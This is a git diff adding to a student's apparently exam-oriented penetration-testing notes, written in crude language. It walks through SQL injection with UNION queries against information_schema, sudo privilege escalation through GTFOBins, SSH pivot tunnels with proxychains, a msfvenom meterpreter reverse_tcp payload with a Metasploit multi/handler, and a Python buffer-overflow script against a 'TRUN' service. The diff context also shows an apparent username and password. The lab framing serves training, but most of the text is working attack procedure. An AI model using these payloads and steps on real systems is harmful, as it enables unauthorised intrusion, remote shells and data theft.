@@ -58,7 +58,8 @@ Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER7
                                                                                         #SSGT Review#
 
 #####################################################################################################################################################################################################
-(Idea can type out in op notes to have for later)
+                                                              #(Idea can type out in op notes to have for later)
+                                             #YOU NEED TO TAKE OPNOTES FOR THE TEST TO RECIEVE CREDIT (CAN BE MAP, OR DOC, NEED TO DO)
 #First Step is open up some sort of notes
     #record given ip
 #Port Discovery
@@ -159,16 +160,121 @@ Array ( [0] => user2 [name] => user2 [1] => RntyrfVfNER78 [pass] => RntyrfVfNER7
             #can try creds we have on port 22 first if you want, but no harm going port 80 first
                 #8 WAYS TOSKIN A CAT
 
-#SQL INJECTIONS
+#SQL INJECTIONS(NEED THIS SHIT TO PASS)
+    #hints you will need sql injections are things like radio buttons (the options things)
+    #when you submit an option it will have a table
+        #only thing we have here to do is sql injections with golden statement
+            #login page can only get usernames and passwords, this can get more
+    #SSGT way
+        #SQL INJECTION
+        0. identify SQL Database (NOT LOGIN)
+        1. identify method for SQL Database Variables
+            1.1 Integers? Strings? Variable Names? GET? POST?
+        2. Identiy vulnerable field
+            2.1 YOU WILL TRY EVERY FIELD
+                2.1.1 OR 1=1 ;#
+                2.1.2 put that after number for each option until we get table dump (will dump everything)
+                2.1.3 put url in notes to have for later
+        3. Identify number of columns <- Skip and Parish
+            3.1 UNION SELECT 1,2,3
+                3.1.1 start with number of columns you can see
+                3.1.2 add , nect number until not an error, if go past 9 we've gone too far
+            3.2 Verify placement of columns
+                3.2.1 make sure it displays the same and if not note how it is displayed
+                3.2.2 if display with estra tuff know to ignore, ex putting a $ in front of data, etc
+        4. Golden statement
+            4.1 UNION select table_schema,table_name,column_name from information_schema.columns;
+                4.1.1 put on end of url we saved with vulnerable field
+                4.1.2 it displays in this case in 1,3,2
+                    4.1.2.1 in this case order golden as table_schema,column_name,table_name
+            4.2 Ensure goldent statement lines up with step 3 (padding, formatting)
+        5. Use Goldent Statement to create custom queries
+        6. ????
+        7. Profit, pass the exam, leave cosc forever
             
+        #Take the golden statement full url and build the next sql injection from its format
+            #on bottom of page is typically where user made table data will be
+            #shit like username, names, userid, etc
+                #may be questions on ctf for test that need to get data from SQL injections this way
+        #IF IT SOMEHOW TURNS SIDEWAYS
+            #have recorded the order in which the output is displayed to stay organizzed and not get got
+#If found some new creds try them out on our new boxes
+    #IT IS OKAY TO NOT GET ONTO A MACHINE
+        #Some machines may be not accessable and if get all questions without accessing move on
+
+#Once finished enumerating, injecting, and trying to access move to next device
+#Try our new creds on this new box just for shits and giggles to see if they work
+
+#ssh onto new box with creds that work
+    whoami
+    hostname
+    #IF NOT IN BASH RUN
+        /bin/bash
+    #try to escalate
+        sudo -l             #in this case we found that we can use /usr/bin/find to escalate
+            #put find into GTFO
+                #has a sudo option, which is how we found it so do that way
+                    #put into notes, then run
+                        #make sure that all paths to commands work
+                            #IF THERE IS A ./ IN A GTFO COMMAND GET THE FUCK RID OF IT
+                    #change shell to bash cause shell sucks
+                    #copy, paste
+                        whoami
+        #if no sudo see above for next steps to try and escalate
+        
+    #now from the device we can get on
+    #host discovery
+        cat /etc/hosts
+        ip n
+        
+        if nothing from there just run ping sweep (see above for) on the same ip addr we are on (or try ip a for possible netowrks)
+            #use context clues to guess what os it is
+    #port discovery (139 and 445 will be exactly what we think no need to banner grab them)
+    #port enumerations (see above for tursted ports)
+    
+    #tunnel
+    ssh <user>@<first> -L 8080:<new ip>:22
+    ssh <user for new>@localhost -p <high from tunnel> -D 9050
+        proxchains nmap, nc etc to enumerate ports for new device we found
+        #when done close out dynamic tunnel
+    ssh Aaron@localhost -p 8080 -L 7777:<ip of win device past 2nd>:9999
+        #in this case 9999 is secure server
+    #DO THE WIN_BUFF.py deal for windows to get on with reverse_tcp
+    #generate shell code
+        msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=7777 -b '\x00' -f python
+                                                      #put ip of whatever is running multihandler
+                                                                    #just a port that aint 4444 (make sure matches in this and script
+        #do from msfconsole
+          msfconsole
+          use multi/handler
+          show options
+          set payload windows/meterpreter/reverse_tcp
+          set LHOST <IP of Box running this from> 
+              #if doing from a tunnel use 0.0.0.0
+          exploit
+
+#SCRIPT TO DO A REVERSE TCP FOR A WIN_BUF IF NEEDED FOR TEST
+import socket #required input
+
+buf = "TRUN /.:/"
+buf += "A" * 2003 #offset
+buf += "\xa0\x12\x50\x62" #EIP from secure Server
+buf += '\90' *20 #NO OP sled for safety
+
+#### Shell Code #####
+#msfvenom -p windows/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=7777 -b '\x00' -f python
+
+#put shell code here
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM) #create the Ipv4 socket, TCP protocol
+s.connect(("<ip from getting shell>", <ip from above>))   #Connect to target ip and port
+print s.recv(1024)                  #Prints Response
+s.send(buf)                         #Send the value of buf
+print s.recv(1024)                  #Print Response
+s.close()                           #closes the socket
 
 
-
-
-
-
-
-
+#Other ways to exploit windows
 
 
 
